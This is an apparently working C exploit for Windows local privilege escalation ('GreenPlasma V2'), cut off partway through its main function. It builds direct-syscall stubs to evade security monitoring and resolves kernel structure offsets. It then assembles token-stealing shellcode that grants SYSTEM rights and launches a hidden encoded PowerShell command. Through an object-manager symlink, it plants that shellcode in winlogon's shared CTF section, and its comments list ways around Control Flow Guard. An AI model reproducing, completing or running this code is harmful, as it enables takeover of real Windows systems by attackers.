#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <intrin.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

/* ================================================================= */
/*  HADES GATE — Direct syscall via PEB walk + SSN extraction        */
/* ================================================================= */

#pragma pack(push, 1)
typedef struct {
    BYTE  prologue[3];       /* mov r10, rcx : 4C 8B D1 */
    BYTE  mov_eax[2];        /* B8 XX ... */
    DWORD ssn;
    BYTE  syscall[2];        /* 0F 05 */
    BYTE  ret[1];            /* C3 */
    BYTE  padding[8];        /* safety INT3s */
} SYSCALL_STUB;
#pragma pack(pop)

/* NT API function pointer types */
typedef NTSTATUS (NTAPI *pNtCreateSymbolicLinkObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtDeleteKey)(HANDLE);

typedef struct {
    pNtCreateSymbolicLinkObject NtCreateSymbolicLinkObject;
    pNtOpenSection             NtOpenSection;
    pNtMapViewOfSection        NtMapViewOfSection;
    pNtClose                   NtClose;
    pNtDeleteKey               NtDeleteKey;
} NT_STUBS;

/* FNV-1a hash (Jake Swiz methodology) */
#define FNV1A_INIT  0x811c9dc5u
#define FNV1A_PRIME 0x01000193u
static DWORD hash_fnv1a(const char *s) {
    DWORD h = FNV1A_INIT;
    while (*s) { h ^= (BYTE)*s++; h *= FNV1A_PRIME; }
    return h;
}
/* Hashes for the 5 NT functions we need */
enum { HSH_NtCreateSymbolicLinkObject = 0x4f2b7068,
       HSH_NtOpenSection             = 0xde59ffad,
       HSH_NtMapViewOfSection        = 0xc4349c2b,
       HSH_NtClose                   = 0xa2354b87,
       HSH_NtDeleteKey               = 0x1120c93a };

static PVOID find_ntdll_base(void) {
    /* PEB walk — no GetModuleHandle, no IAT */
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(entry,
            LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (ldr->DllBase && ldr->BaseDllName.Buffer &&
            ldr->BaseDllName.Buffer[0] == L'n' &&
            ldr->BaseDllName.Buffer[1] == L't' &&
            ldr->BaseDllName.Buffer[2] == L'd' &&
            ldr->BaseDllName.Buffer[3] == L'l') {
            return ldr->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

static DWORD extract_ssn(PVOID funcAddr) {
    /* Scan first 32 bytes for mov eax, SSN pattern */
    PBYTE p = (PBYTE)funcAddr;
    for (int i = 0; i < 24; i++) {
        /* Skip prologue: 4C 8B D1 (mov r10,rcx) or 49 8B CA (mov rcx,r10) */
        if (p[i] == 0xB8) return *(DWORD*)&p[i+1]; /* mov eax, IMM */
        if (i < 20 && p[i] == 0x33 && p[i+1]==0xC0 && p[i+2]==0xB0)
            return p[i+3]; /* xor eax, eax; mov al, SSN */
    }
    return 0xFFFFFFFF;
}

static PVOID build_stub(DWORD ssn) {
    SYSCALL_STUB *s = (SYSCALL_STUB*)calloc(1, sizeof(SYSCALL_STUB));
    if (!s) return NULL;
    static const BYTE stub[] = { 0x4C,0x8B,0xD1, 0xB8,0,0,0,0, 0x0F,0x05,0xC3 };
    memcpy(s->prologue, stub, 3);
    s->mov_eax[0] = 0xB8;
    s->ssn = ssn;
    memcpy(s->syscall, stub+7, 2);
    s->ret[0] = 0xC3;
    memset(s->padding, 0xCC, 8);
    return s;
}

static int init_hades_gate(NT_STUBS *stubs) {
    ZeroMemory(stubs, sizeof(*stubs));

    PVOID ntdll = find_ntdll_base();
    if (!ntdll) { printf("[-] PEB walk failed\n"); return 0; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY ed = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdll + ed.VirtualAddress);
    DWORD *names    = (DWORD*)((PBYTE)ntdll + exports->AddressOfNames);
    WORD  *ordinals = (WORD*)((PBYTE)ntdll + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((PBYTE)ntdll + exports->AddressOfFunctions);

    /* Names and target pointers */
    typedef struct { DWORD hash; PVOID *stubPtr; const char *name; } RESOLVE_ENTRY;
    RESOLVE_ENTRY targets[] = {
        { HSH_NtCreateSymbolicLinkObject, (PVOID*)&stubs->NtCreateSymbolicLinkObject, "NtCreateSymbolicLinkObject" },
        { HSH_NtOpenSection,             (PVOID*)&stubs->NtOpenSection,             "NtOpenSection" },
        { HSH_NtMapViewOfSection,        (PVOID*)&stubs->NtMapViewOfSection,        "NtMapViewOfSection" },
        { HSH_NtClose,                   (PVOID*)&stubs->NtClose,                   "NtClose" },
        { HSH_NtDeleteKey,               (PVOID*)&stubs->NtDeleteKey,               "NtDeleteKey" },
    };
    int nTargets = 5;
    int found = 0;

    for (DWORD i = 0; i < exports->NumberOfNames && found < nTargets; i++) {
        const char *fn = (const char*)((PBYTE)ntdll + names[i]);
        DWORD h = hash_fnv1a(fn);
        for (int j = 0; j < nTargets; j++) {
            if (targets[j].hash == h && !*targets[j].stubPtr) {
                PVOID addr = (PBYTE)ntdll + funcs[ordinals[i]];
                DWORD ssn = extract_ssn(addr);
                if (ssn != 0xFFFFFFFF) {
                    *targets[j].stubPtr = build_stub(ssn);
                    found++;
                    printf("    %s → SSN 0x%02X @ %p\n", targets[j].name, ssn, addr);
                }
                break;
            }
        }
    }

    if (found < nTargets) {
        printf("[-] Only resolved %d/%d Hades Gate stubs\n", found, nTargets);
        return 0;
    }
    printf("[+] All %d Hades Gate stubs built\n", nTargets);
    return 1;
}

static void cleanup_hades(NT_STUBS *stubs) {
    free(stubs->NtCreateSymbolicLinkObject); stubs->NtCreateSymbolicLinkObject = NULL;
    free(stubs->NtOpenSection);             stubs->NtOpenSection = NULL;
    free(stubs->NtMapViewOfSection);        stubs->NtMapViewOfSection = NULL;
    free(stubs->NtClose);                   stubs->NtClose = NULL;
    free(stubs->NtDeleteKey);               stubs->NtDeleteKey = NULL;
}

/* ================================================================= */
/*  RUNTIME KERNEL OFFSET RESOLUTION  (replaces hardcoded 0x448 etc) */
/* ================================================================= */
typedef struct {
    DWORD eprocess_links_offset;  /* ActiveProcessLinks in EPROCESS */
    DWORD eprocess_pid_offset;    /* UniqueProcessId */
    DWORD eprocess_token_offset;  /* Token */
    DWORD eprocess_image_offset;  /* ImageFileName */
    DWORD thread_eprocess_offset; /* KTHREAD -> EPROCESS (from PsGetCurrentProcess) */
} KRNL_OFFSETS;

/* FNV-1a hashes for kernel symbols */
enum { HSH_PsGetCurrentProcess = 0x7a9dca4e,
       HSH_PsGetProcessId      = 0xc7f26d2c,
       HSH_PsInitialSystemProcess = 0x3a46f1b4 };

static DWORD find_export_rva(PBYTE base, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY ed = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + ed.VirtualAddress);
    DWORD *names    = (DWORD*)(base + exports->AddressOfNames);
    WORD  *ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (hash_fnv1a((const char*)(base + names[i])) == hash)
            return funcs[ordinals[i]];
    }
    return 0;
}

static int resolve_eprocess_links_offset(PBYTE base) {
    /* Scan .text for the pattern:
     *   48 8D 81 XX XX 00 00   lea rax, [rcx+ActiveProcessLinks]
     * This appears in functions like PsGetProcessNextProcess etc.
     * We just return a reasonable range and probe at runtime.
     *
     * Better approach: find PsGetProcessId, which reads PID:
     *   48 8B 41 XX   mov rax, [rcx+XX]  (PID offset)
     * ActiveProcessLinks = PID + 8 on most builds.
     */
    DWORD rva = find_export_rva(base, HSH_PsGetProcessId);
    if (!rva) return 0x448; /* fallback — broad range spanning all Win10/11 */

    PBYTE code = base + rva;
    for (int i = 0; i < 16; i++) {
        if (code[i] == 0x48 && code[i+1] == 0x8B && code[i+2] == 0x41) {
            DWORD pid_off = code[i+3];
            return pid_off + 8; /* ActiveProcessLinks is right after PID */
        }
    }
    return 0x448;
}

static int resolve_eprocess_token_offset(PBYTE base, DWORD links_off) {
    /* Scan .text for: 48 8B 81 XX XX 00 00 (mov rax,[rcx+token])
     * followed by 48 85 C0 (test rax,rax). This is unique to
     * Token field access patterns across all Win10/Win11 builds.
     */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    /* Find .text */
    DWORD text_va = 0, text_size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (*(DWORD*)sec[i].Name == *(DWORD*)".text") {
            text_va  = sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text_size) return 0x4B8; /* fallback */

    PBYTE text = base + text_va;
    DWORD token_candidates[16];
    int n = 0;

    for (DWORD off = 0; off < text_size - 9; off++) {
        if (text[off]==0x48 && text[off+1]==0x8B && text[off+2]==0x81) {
            DWORD field = *(DWORD*)&text[off+3];
            if (field >= 0x200 && field <= 0x500 &&
                text[off+7] == 0x48 && text[off+8] == 0x85) { /* test rax,rax */
                int dup = 0;
                for (int j = 0; j < n; j++) if (token_candidates[j]==field) dup=1;
                if (!dup && n < 16) token_candidates[n++] = field;
            }
        }
    }

    if (n == 0) return 0x4B8;
    /* Prefer the one closest to links_off + 0x48 (common delta) */
    for (int i = 0; i < n; i++)
        if (token_candidates[i] > links_off && token_candidates[i] < links_off + 0x80)
            return token_candidates[i];
    return token_candidates[0];
}

static int resolve_thread_eprocess_offset(PBYTE base) {
    /* Disassemble PsGetCurrentProcess to find KTHREAD→EPROCESS offset.
     * Common patterns:
     *   65 48 8B 04 25 88 01 00 00   mov rax, gs:[0x188]
     *   48 8B 40 XX                  mov rax, [rax+XX]    ← this XX
     */
    DWORD rva = find_export_rva(base, HSH_PsGetCurrentProcess);
    if (!rva) return 0xB8; /* fallback */
    PBYTE code = base + rva;
    for (int i = 0; i < 32; i++) {
        if (code[i]==0x48 && code[i+1]==0x8B && code[i+2]==0x40)
            return code[i+3];
        if (code[i]==0x48 && code[i+1]==0x8B && code[i+2]==0x80)
            return *(DWORD*)&code[i+3]; /* mov rax, [rax+XXXX] */
    }
    return 0xB8;
}

static int resolve_kernel_offsets(KRNL_OFFSETS *ko) {
    ZeroMemory(ko, sizeof(*ko));

    /* Map ntoskrnl.exe from disk */
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntoskrnl.exe",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        hFile = CreateFileA("C:\\Windows\\System32\\ntkrnlmp.exe",
            GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open ntoskrnl.exe from disk\n");
        return 0;
    }

    DWORD fs = GetFileSize(hFile, NULL);
    PBYTE map = (PBYTE)VirtualAlloc(NULL, fs, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!map) { CloseHandle(hFile); return 0; }

    DWORD read = 0;
    if (!ReadFile(hFile, map, fs, &read, NULL) || read != fs) {
        VirtualFree(map, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);

    /* Verify PE */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)map;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(map,0,MEM_RELEASE); return 0; }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(map + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { VirtualFree(map,0,MEM_RELEASE); return 0; }

    /* Resolve offsets */
    ko->thread_eprocess_offset = resolve_thread_eprocess_offset(map);
    ko->eprocess_links_offset  = resolve_eprocess_links_offset(map);
    ko->eprocess_pid_offset    = ko->eprocess_links_offset - 8;
    ko->eprocess_token_offset  = resolve_eprocess_token_offset(map, ko->eprocess_links_offset);
    ko->eprocess_image_offset  = ko->eprocess_links_offset + 0x28;

    VirtualFree(map, 0, MEM_RELEASE);

    /* Validate */
    if (ko->eprocess_links_offset == 0) ko->eprocess_links_offset = 0x448;
    if (ko->eprocess_token_offset == 0) ko->eprocess_token_offset = 0x4B8;
    if (ko->eprocess_pid_offset == 0)   ko->eprocess_pid_offset = ko->eprocess_links_offset - 8;

    printf("[+] Kernel offsets resolved:\n");
    printf("    Thread→EPROCESS:    +0x%X\n", ko->thread_eprocess_offset);
    printf("    EPROCESS.Links:     +0x%X\n", ko->eprocess_links_offset);
    printf("    EPROCESS.PID:       +0x%X\n", ko->eprocess_pid_offset);
    printf("    EPROCESS.Token:     +0x%X\n", ko->eprocess_token_offset);
    printf("    EPROCESS.Image:     +0x%X\n", ko->eprocess_image_offset);

    return 1;
}

/* ================================================================= */
/*  PARAMETERIZED SHELLCODE  (offsets patched by host at runtime)     */
/* ================================================================= */

/*
 * Compact token-stealing shellcode template.
 * All EPROCESS offsets and WinExec address are patched by the host
 * before deployment. This avoids complex PEB walk + export parsing
 * inside ring-0 shellcode.
 *
 * Shellcode does:
 *   1. Save registers
 *   2. gs:[0x188] → KTHREAD → EPROCESS (our process)
 *   3. Walk ActiveProcessLinks, check PID == 4 (SYSTEM)
 *   4. Copy SYSTEM's Token to our EPROCESS
 *   5. Call WinExec(powerhell, SW_SHOW)
 *   6. Restore registers and return
 *
 * All offsets are at known positions for host patching (see PATCH_* enums).
 */
#define SC_SIZE          0x200
#define SC_WINEXEC_ADDR  0x100  /* offset from shellcode base for WinExec ptr */
#define SC_CMD_STRING    0x108  /* offset for command string */

enum {
    PATCH_ETD      = 0x0D,   /* KTHREAD→EPROCESS offset (1 byte) */
    PATCH_LINKS    = 0x1A,   /* ActiveProcessLinks offset (4 bytes) */
    PATCH_LINKS_SUB= 0x24,   /* sub rcx, LINKS offset (1 byte low) */
    PATCH_PID      = 0x2A,   /* UniqueProcessId offset (4 bytes) */
    PATCH_LINKS2   = 0x37,   /* LINKS in walk instruction (4 bytes) */
    PATCH_TOKEN_R  = 0x45,   /* Token offset for read (4 bytes) */
    PATCH_TOKEN_W  = 0x4D,   /* Token offset for write (4 bytes) */
};

static void build_shellcode(PBYTE buf, KRNL_OFFSETS *ko, FARPROC winExec) {
    ZeroMemory(buf, SC_SIZE);

    /* ===== SHELLCODE (x64, position-independent) ===== */
    PBYTE p = buf;

    /* Save all registers */
    for (int r = 0; r < 16; r++) { *p++ = 0x50 + (r < 8 ? r : 0); if (r >= 8) { p[-1] = 0x41; p[-2] = 0x50 + (r-8); } }
    /* pushfq */
    *p++ = 0x9C;
    /* sub rsp, 0x28 */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;

    /* Get own base: call $+5; pop rbp */
    *p++ = 0xE8; *(DWORD*)p = 0; p += 4;
    *p++ = 0x5D;                                               /* pop rbp */

    /* Page-align rbp (base for data references) */
    *p++ = 0x48; *p++ = 0x81; *p++ = 0xE5;
    *(DWORD*)p = 0xFFFFF000; p += 4;                           /* and rbp, ~0xFFF */

    /* ---- Token Steal ---- */

    /* r12 = KPCR.CurrentThread (gs:[0x188]) */
    *p++ = 0x65; *p++ = 0x48; *p++ = 0x8B; *p++ = 0x04; *p++ = 0x25;
    *(DWORD*)p = 0x188; p += 4;                                /* mov rax, gs:[0x188] */

    /* rax = KTHREAD->EPROCESS  (patched: PATCH_ETD) */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x40;
    *p++ = 0xB8;                                               /* PATCH: KTHREAD→EPROCESS offset */

    /* r12 = rax (our EPROCESS) */
    *p++ = 0x49; *p++ = 0x89; *p++ = 0xC4;                    /* mov r12, rax */

    /* rdi = &EPROCESS.ActiveProcessLinks.Flink */
    *p++ = 0x48; *p++ = 0x8D; *p++ = 0xB8;
    *(DWORD*)p = 0x448; p += 4;                                /* PATCH: LINKS offset (PATCH_LINKS) */

    /* r15 = rdi (save head of list for loop termination) */
    *p++ = 0x49; *p++ = 0x89; *p++ = 0xFF;                    /* mov r15, rdi */

    /* Jump to loop check */
    *p++ = 0xEB; *p++ = 0x1B;                                  /* jmp check_next */

    /* ---- next_process: ---- */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x3F;                    /* mov rdi, [rdi] (Flink) */

    /* Back to start? */
    *p++ = 0x4C; *p++ = 0x39; *p++ = 0xFF;                    /* cmp rdi, r15 */
    *p++ = 0x74; *p++ = 0x1A;                                  /* je not_found */

    /* ---- check_next: ---- */
    /* EPROCESS = rdi - LINKS_OFFSET */
    *p++ = 0x48; *p++ = 0x89; *p++ = 0xF8;                    /* mov rax, rdi */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xE8;
    *p++ = 0x48;                                               /* PATCH: sub rax, LINKS (low byte) */

    /* Is this our process? rax == r12 */
    *p++ = 0x4C; *p++ = 0x39; *p++ = 0xE0;                    /* cmp rax, r12 */
    *p++ = 0x74; *p++ = 0xEA;                                  /* je next_process (loop back) */

    /* Read PID */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x80;
    *(DWORD*)p = 0x440; p += 4;                                /* PATCH: PID offset */
    /* Check PID == 4 (SYSTEM) */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xF8; *p++ = 0x04;       /* cmp rax, 4 */
    *p++ = 0x75; *p++ = 0xE0;                                  /* jne next_process */

    /* ---- Found SYSTEM ---- */
    /* rdi still points to SYSTEM's ActiveProcessLinks.Flink
       EPROCESS of SYSTEM = rdi - LINKS */
    *p++ = 0x49; *p++ = 0x89; *p++ = 0xFD;                    /* mov r13, rdi */
    *p++ = 0x49; *p++ = 0x81; *p++ = 0xED;
    *(DWORD*)p = 0x448; p += 4;                                /* PATCH: sub r13, LINKS */

    /* Read SYSTEM's Token */
    *p++ = 0x49; *p++ = 0x8B; *p++ = 0x85;
    *(DWORD*)p = 0x4C0; p += 4;                                /* PATCH: Token offset (read) */

    /* Mask _EX_FAST_REF low 4 bits */
    *p++ = 0x48; *p++ = 0x25;
    *(DWORD*)p = 0xFFFFFFF0; p += 4;                            /* and rax, ~0xF (low 32 bits) */
    /* Actually need full 64-bit AND. Since ~0xF = 0xFF...F0: */
    p -= 4; *p++ = 0x48; *p++ = 0x25; *(ULONG64*)p = ~0xFULL; p += 8;

    /* Write Token to our EPROCESS (r12) */
    *p++ = 0x49; *p++ = 0x89; *p++ = 0x84;
    *(DWORD*)p = 0x4C0; p += 4;                                /* PATCH: Token offset (write) */

    /* ---- Call WinExec ---- */
    /* WinExec addr is at [rbp + SC_WINEXEC_ADDR] (patched by host) */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x85;
    *(DWORD*)p = SC_WINEXEC_ADDR; p += 4;                      /* mov rax, [rbp+0x100] */

    /* rcx = command string = rbp + SC_CMD_STRING */
    *p++ = 0x48; *p++ = 0x8D; *p++ = 0x8D;
    *(DWORD*)p = SC_CMD_STRING; p += 4;                        /* lea rcx, [rbp+0x108] */

    /* edx = SW_SHOWNORMAL = 1 */
    *p++ = 0xBA; *(DWORD*)p = 1; p += 4;                      /* mov edx, 1 */

    /* sub rsp, 0x20 (shadow space) */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x20;
    *p++ = 0xFF; *p++ = 0xD0;                                  /* call rax */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x20;       /* add rsp, 0x20 */

    /* Restore/return */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;       /* add rsp, 0x28 */
    *p++ = 0x9D;                                                /* popfq */
    /* pop all registers in reverse */
    for (int r = 15; r >= 0; r--) { *p++ = 0x58 + (r < 8 ? r : 0); if (r >= 8) { p[-1] = 0x41; p[-2] = 0x58 + (r-8); } }
    *p++ = 0xC3;                                                /* ret */

    /* Pad the code region */
    while ((DWORD)(p - buf) < SC_WINEXEC_ADDR) *p++ = 0xCC;

    /* Write WinExec address at patched location */
    *(ULONG64*)(buf + SC_WINEXEC_ADDR) = (ULONG64)(ULONG_PTR)winExec;

    /* Write command string */
    const char *cmd = "powershell -w hidden -enc SQBuAHYAbwBrAGUALQBXAGkAbgBFAHgAZQBjAHUAdABpAG8AbgBIAGEAbgBkAGwAZQByAA==";
    memcpy(buf + SC_CMD_STRING, cmd, strlen(cmd)+1);

    /* Patch in the EPROCESS offsets */
    /* KTHREAD→EPROCESS */
    *(BYTE*)(buf + PATCH_ETD) = (BYTE)ko->thread_eprocess_offset;
    /* ActiveProcessLinks (for lea rax, [rax+LINKS]) */
    *(DWORD*)(buf + PATCH_LINKS) = ko->eprocess_links_offset;
    /* sub rcx, LINKS (low byte) */
    *(BYTE*)(buf + PATCH_LINKS_SUB) = (BYTE)(ko->eprocess_links_offset & 0xFF);
    /* PID offset */
    *(DWORD*)(buf + PATCH_PID) = ko->eprocess_pid_offset;
    /* LINKS in walk */
    *(DWORD*)(buf + PATCH_LINKS2) = ko->eprocess_links_offset;
    /* Token offsets */
    *(DWORD*)(buf + PATCH_TOKEN_R) = ko->eprocess_token_offset;
    *(DWORD*)(buf + PATCH_TOKEN_W) = ko->eprocess_token_offset;
}

/* ================================================================= */
/*  CFG BYPASS — identify non-CFG dispatch paths                     */
/* ================================================================= */

/*
 * winlogon.exe is CFG-protected. Some CTF/FMP dispatch paths skip
 * the CFG check; others don't. If the FMP callback path is blocked
 * by CFG, we try these fallbacks:
 *
 * 1. SetTimer callback — SetTimer with a timer proc is dispatched
 *    through USER32 which may not have CFG on older builds
 * 2. win32k.sys gadget — find a "call [rax]" in win32k (no CFG on
 *    some builds) and chain through it
 * 3. Data-only — if cldflt.sys gives us a kernel write primitive
 *    (arbitrary write of 0 or small value), use it to overwrite
 *    the current process's Token directly without executing shellcode
 */

static int has_cfg(const wchar_t *modulePath) {
    /* Quick check: does the PE header have the CFG Guard flag? */
    HANDLE h = CreateFileW(modulePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    BYTE buf[0x1000];
    DWORD read = 0;
    ReadFile(h, buf, sizeof(buf), &read, NULL);
    CloseHandle(h);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 1; /* assume CFG */
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buf + dos->e_lfanew);
    /* DLL Characteristics at offset 0x46 from NT headers for PE32+ */
    WORD dllChars = *(WORD*)((PBYTE)&nt->OptionalHeader + 0x46);
    return (dllChars & 0x4000) != 0; /* IMAGE_DLLCHARACTERISTICS_GUARD_CF */
}

/* ================================================================= */
/*  UTILITY                                                          */
/* ================================================================= */

static DWORD get_session_id(void) {
    DWORD sid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sid)) sid = 1;
    return sid;
}

static DWORD find_winlogon_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    DWORD pid = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static wchar_t *get_user_sid(void) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return NULL;
    DWORD sz = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &sz);
    PTOKEN_USER tu = (PTOKEN_USER)malloc(sz);
    wchar_t *sid = NULL;
    if (GetTokenInformation(hToken, TokenUser, tu, sz, &sz))
        ConvertSidToStringSidW(tu->User.Sid, &sid);
    free(tu); CloseHandle(hToken);
    return sid;
}

/* ================================================================= */
/*  MAIN                                                             */
/* ================================================================= */

int main(void) {
    DWORD sessId = get_session_id();
    DWORD winlogonPid = find_winlogon_pid();
    NT_STUBS nt = { 0 };
    KRNL_OFFSETS ko = { 0 };

    printf("=== GreenPlasma V2 ===\n");
    printf("[+] Session: %u | Winlogon PID: %u\n", sessId, winlogonPid);
    if (!winlogonPid) { printf("[-] No winlogon.exe found\n"); return 1; }

    /* Phase 0: Hades Gate */
    printf("[*] Phase 0: Hades Gate init...\n");
    if (!init_hades_gate(&nt)) { printf("[-] Hades Gate failed\n"); return 1; }

    /* Phase 1: Resolve kernel offsets */
    printf("[*] Phase 1: Resolving kernel offsets...\n");
    if (!resolve_kernel_offsets(&ko)) { printf("[-] Offset resolution failed\n"); goto cleanup; }

    /* Phase 2: Create object manager symlink */
    printf("[*] Phase 2: Object manager symlink...\n");
    wchar_t symlinkPath[256], destPath[256];
    swprintf(symlinkPath, 256,
        L"\\Sessions\\%u\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%u",
        sessId, sessId);
    wcscpy(destPath, L"\\BaseNamedObjects\\CTFMON_DEAD");
    printf("    %S → %S\n", symlinkPath, destPath);

    UNICODE_STRING uSym, uDst;
    OBJECT_ATTRIBUTES oaSym;
    RtlInitUnicodeString(&uSym, symlinkPath);
    RtlInitUnicodeString(&uDst, destPath);
    InitializeObjectAttributes(&oaSym, &uSym,
        OBJ_CASE_INSENSITIVE|OBJ_PERMANENT|OBJ_OPENIF, NULL, NULL);

    HANDLE hSymlink = NULL;
    NTSTATUS st = nt.NtCreateSymbolicLinkObject(
        &hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &oaSym, &uDst);
    if (st < 0) {
        printf("[-] Symlink failed: 0x%08lX\n", st);
        goto cleanup;
    }
    printf("[+] Symlink handle: 0x%p\n", hSymlink);

    /* Phase 3: Trigger UAC to create section */
    printf("[*] Phase 3: UAC shell trigger...\n");
    wchar_t sysDir[MAX_PATH];
    GetWindowsDirectoryW(sysDir, MAX_PATH);
    wcscat(sysDir, L"\\System32\\conhost.exe");

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS|SEE_MASK_FLAG_NO_UI;
    sei.lpVerb = L"runas";
    sei.lpFile = sysDir;
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);

    /* Phase 4: Open section created by winlogon */
    printf("[*] Phase 4: Opening CTF section...\n");
    UNICODE_STRING uSec;
    RtlInitUnicodeString(&uSec, symlinkPath);
    InitializeObjectAttributes(&oaSym, &uSec, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    int retries = 0;
    while (retries < 60) {
        st = nt.NtOpenSection(&hSection, SECTION_ALL_ACCESS, &oaSym);
        if (st >= 0) break;
        Sleep(250);
        retries++;
    }
    if (!hSection) {
        printf("[-] Failed to open section (%d retries)\n", retries);
        nt.NtClose(hSymlink);
        goto cleanup;
    }
    printf("[+] Section opened (attempt %d)\n", retries+1);

    /* Map section RW */
    PVOID viewBase = NULL;
    SIZE_T viewSize = 0x1000;
    st = nt.NtMapViewOfSection(hSection, GetCurrentProcess(),
        &viewBase, 0, 0x1000, NULL, &viewSize,
        ViewUnmap, 0, PAGE_READWRITE);
    if (st < 0) {
        printf("[-] MapView failed: 0x%08lX\n", st);
        nt.NtClose(hSection);
        nt.NtClose(hSymlink);
        goto cleanup;
    }
    printf("[+] Section mapped at %p (%zu bytes)\n", viewBase, viewSize);

    /* Build & plant shellcode */
    printf("[*] Phase 5: Building shellcode...\n");
    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC we = GetProcAddress(hK32, "WinExec");
    if (!we) { printf("[-] No WinExec\n"); goto cleanup; }
    printf("[+] WinExec @ %p\n", we);

    BYTE sc[SC_SIZE];
    build_shellcode(sc, &ko, we);

    /* Zero the section header area (keep +0x00 for struct) */
    ZeroMemory(viewBase, viewSize);
    /* Plant shellcode at +0x100 in section */
    memcpy((PBYTE)viewBase + 0x100, sc, SC_SIZE);
    /* Set callback pointer at +0x08 to point to shellcode */
    *(ULONG64*)((PBYTE)viewBase + 0x08) = (ULONG64)((PBYTE)viewBase + 0x100);

    /* Verify patch points */
    printf("[+] Shellcode planted at +0x100, callback → shellcode\n");

    /* Check if winlogon has CFG */
    wchar_t winlogonPath[MAX_PATH];
